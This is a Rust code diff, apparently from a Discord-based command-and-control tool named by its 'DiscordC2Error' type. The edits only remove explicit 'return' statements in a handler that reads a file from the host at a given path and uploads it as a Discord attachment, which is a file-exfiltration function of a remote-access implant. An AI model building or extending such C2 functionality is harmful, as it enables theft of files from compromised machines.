@@ -33,7 +33,7 @@ pub async fn run(options: &[CommandDataOption]) -> Result<Option<AttachmentType>
         .resolved.clone()
         .ok_or_else(|| DiscordC2Error::InvalidInput("File path option not found.".to_string()))?;
 
-    return if let CommandDataOptionValue::String(file_path) = option {
+    if let CommandDataOptionValue::String(file_path) = option {
         // Validate the file path and make sure it actually exists
         let path = path_validator(file_path.as_str()).await?;
         let attachment = file_to_attachment(path).await?;
@@ -41,7 +41,7 @@ pub async fn run(options: &[CommandDataOption]) -> Result<Option<AttachmentType>
         Ok(Some(attachment))
     } else {
         Ok(None)
-    };
+    }
 }
 
 async fn path_validator(file_path: &str) -> Result<PathBuf, DiscordC2Error> {
@@ -91,10 +91,10 @@ async fn file_to_attachment(file_path: PathBuf) -> Result<AttachmentType<'static
         }
         final_bytes.extend_from_slice(&buffer);
     }
-    return Ok(AttachmentType::Bytes {
+     Ok(AttachmentType::Bytes {
         data: Cow::from(final_bytes),
         filename: format!("{}.{}", file_name?.to_str().ok_or(DiscordC2Error::InvalidInput("file name couldn't be converted".parse().unwrap()))?, file_extension?.to_str().ok_or(DiscordC2Error::InvalidInput("file name couldn't be converted".parse().unwrap()))?),
-    });
+    })
 }
 
 pub async fn download_handler(
